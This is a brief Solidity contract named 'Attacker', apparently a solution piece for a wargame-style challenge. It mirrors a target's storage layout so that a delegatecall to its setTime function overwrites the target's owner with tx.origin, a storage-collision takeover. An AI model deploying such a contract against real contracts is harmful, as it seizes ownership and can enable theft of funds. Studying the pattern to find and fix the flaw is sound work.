// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint256 _time) external {
        owner = tx.origin;
    }
}